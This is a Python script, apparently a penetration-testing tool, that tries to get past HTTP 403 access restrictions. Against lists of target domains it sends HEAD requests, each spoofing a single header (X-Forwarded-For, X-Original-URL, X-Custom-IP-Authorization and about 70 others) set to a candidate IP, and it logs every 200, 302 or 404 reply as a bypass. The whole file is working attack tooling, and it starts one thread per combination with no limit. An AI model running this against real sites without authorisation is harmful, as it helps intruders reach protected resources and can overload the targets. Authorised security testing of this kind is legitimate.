# -*- coding: utf-8 -*-
import threading
import requests
import argparse
from tqdm import tqdm

# Function to parse command line arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description="403 bypass test using HTTP headers and IPs")
    parser.add_argument('-i', '--ips', type=str, required=True, help="File containing list of IPs")
    parser.add_argument('-d', '--domains', type=str, required=True, help="File containing list of domains")
    parser.add_argument('-o', '--output', type=str, help="File to save the bypass results (optional)")

    return parser.parse_args()

# Function to read file and return a list of lines
def read_file(file_path):
    with open(file_path, "r") as file:
        return [line.rstrip('\n') for line in file]

# Reading the files passed as arguments
args = parse_arguments()
ips_list = read_file(args.ips)
domains_list = read_file(args.domains)
output_file = args.output

# Shared list to accumulate results
results = []

# Defining header variables
header_list = [
    "Access-Control-Allow-Origin", "Base-Url", "CF-Connecting-IP",
    "CF-Connecting_IP", "Client-IP", "Cluster-Client-IP",
    "Destination", "From", "Http-Url", "Origin",
    "Profile", "Proxy", "Proxy-Authenticate",
    "Proxy-Authorization", "Proxy-Client-IP", "Proxy-Host",
    "Proxy-Http", "Proxy-Url", "Real-Ip", "Redirect", "Referer",
    "Referrer", "Request-Uri", "Server", "True-Client-IP", "Uri",
    "Url", "WL-Proxy-Client-IP", "x-amz-website-redirect-location",
    "X-Arbitrary", "X-Client-Ip", "X-Client-IP", "X-Custom-IP-Authorization",
    "X-Custom-IP-Authorization..;/", "x-Envoy-external-adress",
    "x-envoy-internal", "x-envoy-original-dst-host", "X-Forwarded",
    "X-Forwarded-Authorization", "X-Forwarded-By", "x-forwarded-client-cert",
    "X-Forwarded-For", "X-Forwarded-For-Original", "X-Forwarded-Host",
    "X-Forwarded-Proto", "X-Forwarded-Server", "X-Forwarder-For", "X-Forward-For",
    "X-Host", "X-Http-Destinationurl", "X-HTTP-DestinationURL", "X-Http-Host-Override",
    "X-Ip", "X-OReferrer", "X-Original-Host", "X-Originally-Forwarded-For",
    "X-Original-Remote-Addr", "X-Original-Url", "X-Original-URL", "X-Originating-",
    "X-Originating-Ip", "X-Originating-IP", "X-Proxy-Url", "X-Proxy-URL",
    "X-ProxyUser-Ip", "X-Real-Ip", "X-Remote-Addr", "X-Remote-IP",
    "X-Rewrite-Url", "X-Rewrite-URL", "X-WAP-Profile"
]

# Function to write results to an output file (only when the test is finished)
def write_results_to_file(results):
    if results:
        with open(output_file, "w") as file:
            for domain, status_code, header, ip in results:
                file.write(f"[STATUS {status_code}] Bypass: {domain} Header: {header} IP: {ip}\n")

# Function that performs the test for each header and IP
def test_bypass(header, ip, domain, pbar):
    try:
        # Carrying out the request
        response_403 = requests.head(domain, timeout=10)
        http_code_403 = response_403.status_code
        if http_code_403 == 403:
            response = requests.head(domain, headers={header: ip}, timeout=10)
            http_code = response.status_code
            # If the status is 200, 302 or 404, print the result
            if http_code in [200, 302, 404]:
                tqdm.write(f"[STATUS {http_code}] Bypass for Domain: {domain} Header: {header} IP: {ip}")
                if output_file:
                    results.append((domain, http_code, header, ip))
  
    except requests.RequestException as e:
        # If there is an error in the request, ignore it
        pass

    # Updates the progress bar after each test
    pbar.update(1)

# Function that creates threads to test in parallel
def start_threads():
    threads = []
    total_tests = len(header_list) * len(ips_list) * len(domains_list)
    # Progress bar
    with tqdm(total=total_tests, desc="Running") as pbar:
        # Loop through all IPs and headers first
        for ip in ips_list:
            for header in header_list:
                # For each combination of IP and Header, test with all domains
                for domain in domains_list:
                    # Create a new thread for each test (IP, header) on the current domain
                    thread = threading.Thread(target=test_bypass, args=(header, ip, domain, pbar))
                    threads.append(thread)
                    thread.start()
        # Wait for all threads to finish
        for thread in threads:
            thread.join()

    # After all threads finish, write results to file
    print(f"[!] Total bypass found: {len(results)}\n")
    if output_file:
        write_results_to_file(results)

# Main function
def main():
    try:
        print("[+] Testing 403 bypass for multiple domains with different headers and IPs")
        start_threads()
    except KeyboardInterrupt:
        print("\n[!] Execution interrupted by user. Exiting...")

if __name__ == "__main__":
    main()
